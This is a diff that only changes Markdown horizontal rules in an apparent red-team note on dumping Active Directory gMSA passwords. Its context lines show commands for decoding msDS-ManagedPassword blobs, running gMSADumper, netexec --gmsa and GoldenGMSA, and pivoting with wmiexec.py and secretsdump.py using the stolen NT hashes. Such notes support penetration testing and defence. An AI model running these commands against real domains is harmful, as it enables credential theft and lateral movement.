@@ -17,7 +17,7 @@ linked:
 ---
 # AD - gMSA Enumeration - gMSA Password Dump
 
-***
+---
 
 ## msDS-ManagedPassword Blob
 
@@ -47,7 +47,7 @@ $decoded | Select CurrentPassword,
                   @{n='NTHash';e={ConvertTo-NTHash -Password $_.SecureCurrentPassword}}
 ```
 
-___
+---
 
 ## gMSADumper (Python)
 
@@ -73,7 +73,7 @@ python3 gMSADumper.py -u auditor -p 'Pass!' -d corp.local -l <DC>
 # Kerberos: aes128-cts-hmac-sha1-96 ...
 ```
 
-___
+---
 
 ## netexec --gmsa
 
@@ -91,7 +91,7 @@ nxc ldap <DC> -u user -p pass --gmsa
 # [+] Account: WEB_gMSA$  NTLM: 11223344...
 ```
 
-___
+---
 
 ## GoldenGMSA Technique
 
@@ -119,7 +119,7 @@ GoldenGMSA.exe compute \
   --pwdid "<managed-pwd-id-blob>"
 ```
 
-___
+---
 
 ## Native PowerShell Read
 
@@ -142,7 +142,7 @@ $decoded = ConvertFrom-ADManagedPasswordBlob $blob
 $decoded.CurrentPassword | ConvertTo-NTHash
 ```
 
-___
+---
 
 ## NT Hash Extraction
 
@@ -153,7 +153,7 @@ ___
 | `nxc ldap <DC> -u u -p p --gmsa` | Mismo | Standard. |
 ^ad-gmsadump-nthash
 
-___
+---
 
 ## Pivot Post-Dump
 
@@ -181,4 +181,4 @@ wmiexec.py -hashes :"$NT" "corp.local/$GMSA@<target>"
 secretsdump.py -hashes :"$NT" "corp.local/$GMSA@<DC>"
 ```
 
-***
+---
